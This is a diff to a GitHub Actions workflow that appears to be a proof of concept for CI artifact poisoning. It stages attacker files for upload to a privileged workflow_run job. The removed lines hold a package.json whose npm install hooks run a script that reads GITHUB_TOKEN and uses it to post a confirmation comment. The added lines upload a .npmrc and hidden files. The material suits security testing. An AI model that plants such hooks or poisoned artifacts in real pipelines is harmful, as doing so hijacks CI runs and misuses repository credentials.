@@ -8,55 +8,10 @@ jobs:
   lint:
     runs-on: ubuntu-latest
     steps:
-      - name: Save PR number
-        if: always()
-        env:
-          PR_NUMBER: ${{ github.event.pull_request.number }}
-        run: |
-          echo "$PR_NUMBER" > pr-number.txt
-          echo "attacker controlled linter output" > linter-report.txt
-
       - name: Stage attacker artifact payload
         run: |
-          cat > package.json <<'JSON'
-          {
-            "name": "poc-root",
-            "version": "1.0.0",
-            "private": true,
-            "scripts": {
-              "preinstall": "node ./poc-hook.js",
-              "install": "node ./poc-hook.js",
-              "postinstall": "node ./poc-hook.js",
-              "prepare": "node ./poc-hook.js"
-            }
-          }
-          JSON
-          cat > poc-hook.js <<'JS'
-          const fs = require('fs');
-          (async () => {
-            const token = process.env.GITHUB_TOKEN || '';
-            const repo = process.env.GITHUB_REPOSITORY;
-            const runId = process.env.GITHUB_RUN_ID;
-            const line = 'RCE-HOOK-OK run=' + runId + ' actor=' + process.env.GITHUB_ACTOR + ' token_present=' + !!token + ' token_len=' + token.length + ' repo=' + repo;
-            console.log(line);
-            try {
-              const prNumber = (fs.existsSync('pr-number.txt') ? fs.readFileSync('pr-number.txt', 'utf8').trim() : '') || '1';
-              const res = await fetch('https://api.github.com/repos/' + repo + '/issues/' + prNumber + '/comments', {
-                method: 'POST',
-                headers: {
-                  Authorization: 'Bearer ' + token,
-                  Accept: 'application/vnd.github+json',
-                  'Content-Type': 'application/json',
-                  'X-GitHub-Api-Version': '2022-11-28'
-                },
-                body: JSON.stringify({ body: 'RCE-HOOK-CONFIRMED: attacker npm lifecycle hook executed in privileged workflow_run job. run=' + runId + ' actor=' + process.env.GITHUB_ACTOR })
-              });
-              const j = await res.json();
-              console.log('comment status', res.status, 'url', j.html_url || j.message);
-            } catch (e) { console.log('comment error', e.message); }
-            try { fs.appendFileSync('linter-report.txt', '\n' + line + '\n'); } catch (e) { console.log('append failed', e.message); }
-          })();
-          JS
+          echo "${{ github.event.pull_request.number }}" > pr-number.txt
+          printf 'attacker controlled linter output' > linter-report.txt
 
       - name: Upload linter report
         if: always()
@@ -67,5 +22,7 @@ jobs:
             pr-number.txt
             linter-report.txt
             package.json
-            poc-hook.js
+            .npmrc
+            poc-evil
+          include-hidden-files: true
           if-no-files-found: ignore
